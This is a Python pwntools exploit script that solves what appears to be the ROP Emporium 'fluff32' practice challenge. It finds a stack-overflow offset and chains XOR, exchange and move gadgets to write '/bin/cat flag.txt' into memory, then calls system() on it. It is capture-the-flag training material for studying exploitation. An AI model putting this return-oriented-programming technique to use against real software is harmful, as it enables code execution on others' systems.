#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level = 'debug'
io = process(exe.path)
io.sendline(cyclic(511))
io.wait()
core = io.corefile
stack = core.eip
info("stack: %#x", stack)
#pattern = core.read(stack, 4)
offset = cyclic_find(stack)
info("pattern: %r", stack)
info("offset:  %d", offset)

# CONSTANTS
system = 0x804865a
data_addr = 0x804a044

# GADGETS

# This gadget is a pain
# 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx;
#             xor byte ptr [ecx], bl; ret;
# remember, 'bl' is the lower part of ebx
mov_ptr_ecx_edx = 0x8048693

# 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
xor_edx_edx = 0x8048671

# 0x080483e1: pop ebx; ret;
pop_ebx = 0x80483e1

# 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
xor_edx_ebx = 0x804867b

# 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
xchg_edx_ecx = 0x8048689


# COMMAND STRING (/bin/cat flag.txt)
bin_cat_a = 0x2f62696e
bin_cat_b = 0x2f636174
bin_cat_c = 0x20666c61
bin_cat_d = 0x672e7478
bin_cat_e = 0x74000000


info("OPTION 1: Using /bin/cat flag.txt approach")
# NOTE: I specify endian="BIG" for the strings so I don't have 
# to reverse the bytes from the conversion tool
payload = fit({
    offset: [
        # STEP 1: addr to ecx
        # clear edx + dummy for extra pop
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        # target addr into ebx
        p32(pop_ebx),
        p32(data_addr),
        # copy addr from ebx into edx + dummy for extra pop
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        # mov addr from edx to ecx + dummy for extra pop
        p32(xchg_edx_ecx),
        p32(0xdeadbeef),
        # STEP 2: data to edx
        # clear edx + dummy for extra pop
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        # cmd part a into ebx
        p32(pop_ebx),
        p32(bin_cat_a, endian="big"),
        # copy cmd part a from ebx into edx + dummy for extra pop
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        # STEP 3: copy cmd part a into memory 
        #  + dummy for pop1, 0 for pop2
        p32(mov_ptr_ecx_edx),
        p32(0xdeadbeef),
        p32(0x0),

        # now, repeat for part 2
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(data_addr+4),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(xchg_edx_ecx),
        p32(0xdeadbeef),
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(bin_cat_b, endian="big"),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(mov_ptr_ecx_edx),
        p32(0xdeadbeef),
        p32(0x0),

        # now, repeat for part 3
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(data_addr+8),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(xchg_edx_ecx),
        p32(0xdeadbeef),
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(bin_cat_c, endian="big"),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(mov_ptr_ecx_edx),
        p32(0xdeadbeef),
        p32(0x0),

        # now, repeat for part 4
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(data_addr+12),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(xchg_edx_ecx),
        p32(0xdeadbeef),
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(bin_cat_d, endian="big"),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(mov_ptr_ecx_edx),
        p32(0xdeadbeef),
        p32(0x0),

        # now, repeat for part 5
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(data_addr+16),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(xchg_edx_ecx),
        p32(0xdeadbeef),
        p32(xor_edx_edx),
        p32(0xdeadbeef),
        p32(pop_ebx),
        p32(bin_cat_e, endian="big"),
        p32(xor_edx_ebx),
        p32(0xdeadbeef),
        p32(mov_ptr_ecx_edx),
        p32(0xdeadbeef),
        p32(0x0),

        p32(system),
        p32(data_addr)]
    })


with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io = process(exe.path)
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)

